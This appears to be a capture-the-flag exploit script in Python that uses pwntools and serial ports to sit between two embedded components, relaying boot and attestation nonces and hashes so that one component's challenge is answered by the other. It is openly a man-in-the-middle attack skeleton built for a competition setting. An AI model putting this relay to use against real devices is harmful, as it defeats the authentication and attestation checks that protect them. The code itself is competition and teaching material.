import argparse
import serial
from pwn import *

SEND = 0
RECV = 1

def ser_write(ser, data):
    ser.write(data)
    # serial will echo input back to us
    ser.read(size=len(data))

def ser_read(ser, length):
    return ser.read(size=length)

# This is a relay for talking to 2 components, intended for use in the black box scenario
class Relay:
    def __init__(self, comp_id):
        self.debug = False

        parser = argparse.ArgumentParser(
            prog="b01lers relay",
            description="Acts as a relay between the ap and component, allowing man in the middle attacks in a python script"
        )

        parser.add_argument(
            "-c1",
            "--component-one",
            required=True,
            help="The first component to talk to"
        )
        parser.add_argument(
            "-c2",
            "--component-two",
            required=True,
            help="The second component to talk to"
        )

        args = parser.parse_args()

        self.c1 = serial.Serial(
            port=args.component_one,
            baudrate=115200,
            parity=serial.PARITY_NONE,
            stopbits=serial.STOPBITS_ONE,
            bytesize=serial.EIGHTBITS,
        )

        self.c2 = serial.Serial(
            port=args.component_two,
            baudrate=115200,
            parity=serial.PARITY_NONE,
            stopbits=serial.STOPBITS_ONE,
            bytesize=serial.EIGHTBITS,
        )

        self.comp_id = comp_id

        # this print is necessary for delays
        print(comp_id)
        # tell relays ids to talk to
        ser_write(self.c1, p32(comp_id))
        ser_write(self.c2, p32(comp_id))

    def recv(self, ser):
        ser.reset_input_buffer()

        ser_write(ser, p8(RECV))
        len = ser_read(ser, 1)
        print(len)
        len = u8(len)
        print(len)
        return ser_read(ser, len)

    def send(self, ser, data):
        ser.reset_input_buffer()

        ser_write(ser, p8(SEND))
        ser_write(ser, p8(len(data)))
        ser_write(ser, data)

        # wait for ack byte
        _ack = ser_read(ser, 1)
        print(_ack)

    def recv_from_c1(self):
        out = self.recv(self.c1)

        if self.debug:
            print(f"from c1: {out}")

        return out

    def send_to_c1(self, data):
        if self.debug:
            print(f"to c1: {data}")

        self.send(self.c1, data)

    def recv_from_c2(self):
        out = self.recv(self.c2)

        if self.debug:
            print(f"from c2: {out}")

        return out

    def send_to_c2(self, data):
        if self.debug:
            print(f"to c2: {data}")

        self.send(self.c2, data)

VALIDATE = 2
BOOT = 3
ATTEST = 4

def boot(relay):
    relay.send_to_c1(p8(BOOT))

    nonce = relay.recv_from_c1()

    validate_message = bytearray()
    validate_message.append(VALIDATE)
    validate_message.extend(nonce)
    relay.send_to_c2(bytes(validate_message))

    hash = relay.recv_from_c2()

    relay.send_to_c1(hash)
    validate_result = relay.recv_from_c1()

    boot_message = relay.recv_from_c1()
    print(boot_message)

def attest(relay):
    relay.send_to_c1(p8(ATTEST))

    nonce = relay.recv_from_c1()

    validate_message = bytearray()
    validate_message.append(VALIDATE)
    validate_message.extend(nonce)
    relay.send_to_c2(bytes(validate_message))

    hash = relay.recv_from_c2()

    relay.send_to_c1(hash)
    validate_result = relay.recv_from_c1()

    attest_data = relay.recv_from_c1()
    print(attest_data)

# put your exploit code in this function
def exploit():
    # black box
    relay = Relay(0x3ff2f26f)

    # operational c0
    # relay = Relay(0x5d42446e)
    relay.debug = True

    # attest(relay)
    boot(relay)

if __name__ == "__main__":
    exploit()
